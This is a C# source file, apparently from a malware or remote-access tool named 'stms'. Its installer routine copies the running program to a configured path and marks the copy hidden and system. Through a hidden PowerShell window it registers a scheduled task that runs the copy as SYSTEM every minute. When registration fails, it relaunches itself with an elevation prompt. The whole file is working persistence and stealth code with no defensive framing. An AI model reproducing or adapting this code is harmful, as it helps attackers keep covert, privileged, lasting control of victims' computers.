using System.Diagnostics;
using stms.Configuration;

namespace stms.Install;

public static class Installation
{
    public static void Install()
    {
        try
        {
            if (File.Exists(Config.file_path))
                File.Delete(Config.file_path);

            File.Copy(Environment.ProcessPath, Config.file_path, true);
            File.SetAttributes(Config.file_path, FileAttributes.Hidden | FileAttributes.System);

            try
            {
                string psCommand = $"Register-ScheduledTask -TaskName '{Config.task_name}' " +
                                   $"-Action (New-ScheduledTaskAction -Execute '{Config.file_path}' -Argument '--start') " +
                                   $"-Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)) " +
                                   $"-Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) " +
                                   $"-Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew) -Force";

                string arguments = $"-NoProfile -WindowStyle Hidden -Command \"{psCommand}\"";

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = arguments,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                };

                using (Process? process = Process.Start(psi))
                {
                    process?.WaitForExit();

                    if (process?.ExitCode != 0)
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = Environment.ProcessPath,
                            Arguments = "--install",
                            Verb = "runas",
                            UseShellExecute = true
                        });
                        Environment.Exit(0);
                    }
                }
            }
            catch (Exception)
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = Environment.ProcessPath,
                    Arguments = "--install",
                    Verb = "runas",
                    UseShellExecute = true
                });
                Environment.Exit(0);
            }
        }
        catch (UnauthorizedAccessException)
        {
            Console.WriteLine("error");
        }
        catch (Exception)
        {
            Console.WriteLine("error");
        }

        Environment.Exit(0);
    }
}